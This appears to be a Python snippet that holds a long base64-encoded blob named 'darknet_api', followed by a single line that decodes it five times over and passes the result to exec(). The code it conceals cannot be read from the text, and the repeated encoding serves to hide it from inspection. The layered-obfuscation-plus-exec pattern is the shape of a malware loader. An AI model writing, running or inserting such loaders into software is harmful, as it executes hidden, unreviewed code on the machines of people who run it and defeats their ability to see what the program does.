WVTVDV2pGcmVXRkhhR2xpVkZaeldXdFpOVTFYVFhsV2JteHBZbFZhTUZkc1RqTlRNR3hFVVZka1NsRXdSbTVUVlU1RFkwWndSR1F3ZEVwUk1FWnVVMVZPUWxvd2JFUlJiWFJhVjBaS2IxVkdhRU5rYlUxNlZXNXdUV0pVUm5OWmVrNVBZVVp2ZVZadWNGaGxhMHByVkVjMVMySkhUa2hsUkZaWlRXcEdiMWt5TVRCTlYwNUVUbGhzYVUweVVqWldNM0JIV2tWNGRGTnFSbXRUUmtveVdXMDFUMWxyTVZkTlNGWmhVakJaZDFkV1JuWmFNR3hFVVZka1NsRXdSbTVUVlU1eVkwVk9jRkZYWkVwUk1FWnVVMVZPUWxveVRYcGlTSEJOWW1zMGQxZHJZelZOVjFKRVRsUk9hbUpYZDNkWGJFNXVZVlZzU0ZKdVZtRlJNRXBWV1ZSS2MyUXdiRVpVYldocVUwWktjVmxWWkVaa1ZYaHdUa2RvU21GWGRFeFRWVTVDV2pCc1JGRlhaRXBSTUVvMldsWm9UbVJYVFhwVmJYUnBUVEZaZDFSSE1XRmpNbEpaVkcwNVRGRXlkRXhUVlU1Q1dqQnNSRkZYWkVwUk1FbzJXV3RrVjJKSFRrUmFNMnhNVlZjNWJsTlZUa0phTUd4RVVWZGtTbE5GTkRGWk0yc3haVzFTU0ZWdVdtdFhSa1l4VjIweE5FMVhUWGxhTWpsTVZWYzVibE5WVGtKYU1YQlpZVWR3WVZkRlNYZFVNbVIyV2pCc1JGRlhaRXBSTUVadVUxVm9UMDVYVGpWT1dIQnJVakZLTWxwR2FGSmtWbkIwWlVSR2FrMXRaSFpUTVVaMldqQnNSRkZYWkVwUk1FWnVVMVZvVDJNeGNGaFdibVJNVWtVeGQxRXliRUphTUd4RVVWZGtTbEV3Um01WmVrNXpaV3Q0ZFZScVFtRlNlbXQ0V2tWTk1XSlhTa2xXYm5Cb1VUSmtkMUV5YkVKYU1HeEVVVmRrU2xFd1JtNVpNR00xWlcxU1NWUlhaRkZWTUVweFdXdGtjMkpIU25WVlZ6bFRUV3haZDFVd1pITmxiVkpJVDFoc2JGWnJjSE5aTVdoWFlrZE5lbFZYT1dwU01WcHpXVEp2ZUdGdFJraFNibFpwWWxaYWVsZEVTbGRrVjFKSVlrUkNiRlV6YUhwWlZtTjRZMGRTUlUxSWFFMVNlbXgwVjIwMVQySkhVa2RQVjNSYVYwWktjMVZHVlRGa2JVcDBWbGhPYVUxc2NIUlpla3BYVFVabmVXSkhkRkZXUlVaNldXeGtSMDVHWjNsaVIzUlJWa1ZHZWxsc1pITmtWbWQ1WWtkMFVWWkZSbnBYVm1SVFlURm5lVTlYTVdGaWF6VnpXa1ZSZDJRd2VFaGhSMmhxVFcxak5WUlZUbkpqUlU1d1VWZGtTbEV3Um01VFZVNUNXakpLV0ZadWNHcE5hMXAxVjJ4T1FrOVZiRWxSYmxwcVRURktObFJITUhoaVIwMTZWRzFvWVUxc1dqWldNM0JEV2tWNGRFMVhlR3BOTURWdlYycEtWbE13YkVSUlYyUktVVEJHYmxOVlRrTmpSbkJ3VVc1a2FVMHdOSGRaTTJzeFpFWndXVlJ1Y0ZwV01sSnpXWHBHZW1ReGFGUk9XRkpoVjBVMU5sZFdaR3RpUlhoMFYyNUNhV0pXUm5aVFYzaHpaRzFTVkZGdVVtdFhSVFIzVTFWb1QwMUdiRmxoTW14TVZUQkdiMVZHVGtKa1JURlVVVzVhYW1GVlNqTlphazVQVFVkT05VNVlVbUZYUlRVMlYxWmthMkpIVFhoak0yUlpWWHBXTUZkc2FFOWxiR3hZV2tkNFRXSldjSGRaYlRGU1lqQnNjMUZ1VG1GV01GbzJWMnhPUTJWdFVraFNhbFpLVW5wc01WTlhiSEphTUd4VlRVZGtUVlpGVlRKUk1teENXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3lUWGxXYlhCS1VrUkNibGt5TVZaa1ZuQjBZa2hXWVZJd1ducFphMDV1WW10MFIyUkhUbGxTTVVZeFYwWmFORmt4Y0VSak0wSkxaVmhrYmxsc1pGZGxiVTE1VW0wMVlWVXlkRXhUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUTAxSFVsaE9WelZoVFRGV2RsbFdZekZOUlhSSlZHMTRXazFZVGpOWFJrNXlZMFZPY0ZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJScVRUSjRObFJITlU5TlJuQklUMVJHYTFGNlZuUlphMmhYWlcxR1JGb3pRa1JoVlVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxsNlNqUmlSbkJaVVZjNVRsVXlkRXhUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUTJWdFZsbFVXRlpxVFRGS2NsbHFUbGROUlhoMFYyNU9hMWRGTlhaVE1FNXlVekJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSYm1ScFRUQTBkMWt6YkVKUFZXeElWRzVPYUZZeFdqRmFSVTV2VTBad1dWVnJiR2hYUlRSM1dXcE9TMDVXVm5SV2JtaHJWakZhTmxwRlRtOWtNWEJZVm01c1VWWXdOWFpYVm1NeFpGWndXR1ZIV21GV2VsVjNXVlpvVTA1VmVFaGxTRUpwVmpKM2QxVkdVa3BqTWtsNVYyMHhhazFzV1hkWFJFcFRZVWRTU0ZaVWJGVmlWR3d4VjJ4T05HUnNjSFJYYm5CaFYwWktiVmxXWkZKUFZURkVaVWhTV2xkSGFHMVpWbVJTVDFVeFJHVklVbWhXZWxadFdWWmtVazlWTVVSbFIyaGhVakZLYlZscVNtRmlWMDE1Vm1wQ1VWWkZSbnBaVldSSFpXMUdSVTFJWkV4Vk1uUk1VMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa05rUm5CWlZHNXdXbFl5VW5OWk1qRlhaV3RzUlUxSFpHcFNlbXcyV2tWb1RtUlhTbGhXYm5CcVRXdGFkVmRzYUU5WmF6RlhUVWhXYVZZeFdqWlpla3BIWW14d1VtSXlaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVMFUxZWxkc1pGZGtNSFJGVTFoQ1JHRlZSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVXWHBPYzJWcmVIVlVha0poVW5wcmVGcEZUVEZpVjBwSlZtNXdhRkV5WkhkUk1teENXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3lUWHBpU0hCTlltczBkMWRyWXpWTlYxSkVUbFJPYW1KWGQzZFhiRTV1WVZWc1NXVkVhRXBSTUd4NVdXeGtWMlZ0VFhsU2JUVmhWMFZ3YzFremJIcGhWV3h3WVRCMFNsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FbzJXbFpvVG1SWFRYcFZiWFJwVFRGWmQxUkhNV0ZqTWxKWlZHMDVURkV5ZEV4VFZVNUNXakJzUkZGWFpFcFJNRXB6V1d0b1QySkZPVzVpTW1SS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xORlNtOVplazVPVXpGd2RHSklWbHBXTTJoNldsWlNkbE13YkVSUlYyUmFUVzVvZDFkc1l6Rk5SWGgwVlc1Q2FrMXJOVEpaYlRBeFlrWnJlbFZYT1V4VlZEQTU="
exec(base64.b64decode(base64.b64decode(base64.b64decode(base64.b64decode(base64.b64decode(darknet_api))))))
